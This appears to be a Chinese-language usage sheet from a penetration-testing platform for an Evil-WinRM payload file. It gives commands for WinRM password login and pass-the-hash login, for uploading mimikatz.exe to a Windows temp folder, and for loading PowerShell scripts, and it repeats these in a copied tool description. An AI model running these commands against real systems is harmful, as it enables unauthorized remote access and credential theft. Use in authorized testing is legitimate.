## 📦 载荷使用说明：evil_winrm.sh

该载荷文件主要配合 **Evil-WinRM** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `Evil-WinRM` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
evil-winrm -i 192.168.1.60 -u admin -p Pass123
```

**配置示例 2**：
```bash
evil-winrm -i 192.168.1.60 -u admin \\
  -H 8846f7eaee8fb117ad06bdd830b7586c
```

**配置示例 3**：
```bash
# 上传文件
upload /local/mimikatz.exe C:\\\\Windows\\\\Temp\\\\

# 加载 PowerShell 脚本
evil-winrm -i 192.168.1.60 -u admin -p Pass123 \\
  -s /opt/scripts/
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## Evil-WinRM WinRM连接

### 密码登录
```bash
evil-winrm -i 192.168.1.60 -u admin -p Pass123
```

### Hash 登录 (PTH)
```bash
evil-winrm -i 192.168.1.60 -u admin \\
  -H 8846f7eaee8fb117ad06bdd830b7586c
```

### 文件操作
```bash
# 上传文件
upload /local/mimikatz.exe C:\\\\Windows\\\\Temp\\\\

# 加载 PowerShell 脚本
evil-winrm -i 192.168.1.60 -u admin -p Pass123 \\
  -s /opt/scripts/
```

- ✓ 支持文件上传下载
- 需要目标开放 5985/5986 端口